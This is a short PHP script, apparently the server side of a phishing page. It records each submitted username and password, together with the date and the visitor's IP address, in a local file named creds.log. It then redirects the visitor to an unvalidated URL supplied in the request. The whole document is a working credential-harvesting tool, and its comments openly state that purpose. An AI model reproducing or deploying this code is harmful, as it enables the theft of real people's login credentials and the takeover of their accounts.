<?php
    if (isset($_POST["submit"])) {
        # Retrieving credentials
        $username = $_POST["username"];
        $password = $_POST["password"];

        # Writing credentials to a file
        $log_file = fopen("creds.log", "a");
        $client_ip = $_SERVER["REMOTE_ADDR"];
        $current_date = date("Y-m-d H:i:s");

        $log_entry = "Date: $current_date\n";
        $log_entry .= "IP: $client_ip\n";
        $log_entry .= "Username: $username\n";
        $log_entry .= "Password: $password\n";
        $log_entry .= "--------------------------\n";

        fwrite($log_file, $log_entry);

        fclose($log_file);
    }

    # Redirect
    header("Location: ".$_POST["redirect"])
?>